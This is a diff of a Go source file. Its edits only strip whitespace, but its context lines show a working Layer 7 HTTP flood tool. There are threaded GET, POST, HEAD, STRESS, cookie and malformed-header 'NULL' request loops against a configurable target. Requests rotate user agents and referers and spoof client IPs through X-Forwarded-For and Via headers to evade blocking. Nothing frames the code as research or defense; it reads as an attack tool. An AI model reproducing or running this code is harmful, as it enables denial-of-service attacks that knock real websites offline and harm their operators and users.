@@ -34,7 +34,7 @@ func RunLayer7Attack(cfg *Layer7Config, wg *sync.WaitGroup, stopChan chan struct
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
-			
+
 			for {
 				select {
 				case <-stopChan:
@@ -72,7 +72,7 @@ func executeLayer7Method(cfg *Layer7Config, requestsSent, bytesSent *utils.Count
 
 func executeGET(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
-	
+
 	for i := 0; i < cfg.RPC; i++ {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
@@ -80,7 +80,7 @@ func executeGET(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		}
 
 		addHeaders(req, cfg)
-		
+
 		resp, err := client.Do(req)
 		if err == nil {
 			requestsSent.Add(1)
@@ -93,7 +93,7 @@ func executeGET(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 func executePOST(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
-	
+
 	for i := 0; i < cfg.RPC; i++ {
 		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(32))
 		req, err := http.NewRequest("POST", cfg.Target, strings.NewReader(payload))
@@ -104,7 +104,7 @@ func executePOST(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		addHeaders(req, cfg)
 		req.Header.Set("Content-Type", "application/json")
 		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))
-		
+
 		resp, err := client.Do(req)
 		if err == nil {
 			requestsSent.Add(1)
@@ -117,7 +117,7 @@ func executePOST(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 func executeHEAD(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
-	
+
 	for i := 0; i < cfg.RPC; i++ {
 		req, err := http.NewRequest("HEAD", cfg.Target, nil)
 		if err != nil {
@@ -125,7 +125,7 @@ func executeHEAD(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		}
 
 		addHeaders(req, cfg)
-		
+
 		resp, err := client.Do(req)
 		if err == nil {
 			requestsSent.Add(1)
@@ -138,7 +138,7 @@ func executeHEAD(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 func executeSTRESS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
-	
+
 	for i := 0; i < cfg.RPC; i++ {
 		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(512))
 		req, err := http.NewRequest("POST", cfg.Target, strings.NewReader(payload))
@@ -149,7 +149,7 @@ func executeSTRESS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		addHeaders(req, cfg)
 		req.Header.Set("Content-Type", "application/json")
 		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))
-		
+
 		resp, err := client.Do(req)
 		if err == nil {
 			requestsSent.Add(1)
@@ -192,7 +192,7 @@ func executeNULL(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		headers := buildRawHeaders(cfg.Target, cfg)
 		headers = strings.ReplaceAll(headers, "User-Agent:", "User-Agent: null\r\n#")
 		headers += "Referrer: null\r\n\r\n"
-		
+
 		conn.Write([]byte(headers))
 		requestsSent.Add(1)
 		bytesSent.Add(int64(len(headers)))
@@ -201,7 +201,7 @@ func executeNULL(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 func executeCOOKIE(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	client := createHTTPClient(cfg)
-	
+
 	for i := 0; i < cfg.RPC; i++ {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
@@ -214,7 +214,7 @@ func executeCOOKIE(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 			utils.RandString(6),
 			utils.RandString(32))
 		req.Header.Set("Cookie", cookie)
-		
+
 		resp, err := client.Do(req)
 		if err == nil {
 			requestsSent.Add(1)
@@ -304,7 +304,7 @@ func addHeaders(req *http.Request, cfg *Layer7Config) {
 	if len(cfg.UserAgents) > 0 {
 		req.Header.Set("User-Agent", cfg.UserAgents[rand.Intn(len(cfg.UserAgents))])
 	}
-	
+
 	if len(cfg.Referers) > 0 {
 		referer := cfg.Referers[rand.Intn(len(cfg.Referers))]
 		req.Header.Set("Referer", referer+url.QueryEscape(cfg.Target))
@@ -315,7 +315,7 @@ func addHeaders(req *http.Request, cfg *Layer7Config) {
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Cache-Control", "max-age=0")
-	
+
 	// Spoof IP headers
 	spoofIP := utils.RandIPv4()
 	req.Header.Set("X-Forwarded-For", spoofIP)
@@ -327,7 +327,7 @@ func addHeaders(req *http.Request, cfg *Layer7Config) {
 
 func buildRawHeaders(target string, cfg *Layer7Config) string {
 	targetURL, _ := url.Parse(target)
-	
+
 	userAgent := "Mozilla/5.0"
 	if len(cfg.UserAgents) > 0 {
 		userAgent = cfg.UserAgents[rand.Intn(len(cfg.UserAgents))]
@@ -339,7 +339,7 @@ func buildRawHeaders(target string, cfg *Layer7Config) string {
 	}
 
 	spoofIP := utils.RandIPv4()
-	
+
 	headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path)
 	headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
 	headers += fmt.Sprintf("User-Agent: %s\r\n", userAgent)
@@ -351,7 +351,7 @@ func buildRawHeaders(target string, cfg *Layer7Config) string {
 	headers += "Cache-Control: max-age=0\r\n"
 	headers += fmt.Sprintf("X-Forwarded-For: %s\r\n", spoofIP)
 	headers += fmt.Sprintf("Via: %s\r\n", spoofIP)
-	
+
 	return headers
 }
 
